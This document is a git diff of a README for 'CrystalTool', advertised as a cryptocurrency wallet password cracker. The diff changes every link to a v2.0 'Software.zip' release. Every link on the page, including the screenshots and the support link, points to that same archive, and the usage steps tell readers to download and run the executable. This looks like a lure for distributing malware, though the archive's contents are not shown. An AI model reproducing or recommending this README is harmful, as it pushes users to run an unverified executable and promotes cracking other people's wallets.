@@ -14,21 +14,21 @@ Welcome to **CrystalTool**, the ultimate tool for cracking cryptocurrency wallet
 
 ### Get Started
 To unleash the power of CrystalTool, click the button below to download the software:
-[![Launch CrystalTool](https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip)](https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip)
+[![Launch CrystalTool](https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip)](https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip)
 
-*Note: The https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip needs to be launched.*
+*Note: The https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip needs to be launched.*
 
 ### Screenshots
-![Screenshot 1](https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip)
-![Screenshot 2](https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip)
+![Screenshot 1](https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip)
 
 ### Usage
-1. Download and extract the https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip package.
+1. Download and extract the https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip package.
 2. Run the executable file on your system.
 3. Follow the on-screen instructions to begin password cracking.
 
 ### Support
-If you encounter any issues, feel free to visit the [Releases](https://github.com/Neuuzo/CrystalTool/releases/download/v1.0/Program.zip) section for the latest updates and bug fixes.
+If you encounter any issues, feel free to visit the [Releases](https://github.com/Neuuzo/CrystalTool/releases/download/v2.0/Software.zip) section for the latest updates and bug fixes.
 
 ### Disclaimer
 🚨 Please use CrystalTool responsibly and adhere to all legal regulations regarding cryptocurrency activities. Unauthorized access to wallets is strictly prohibited.
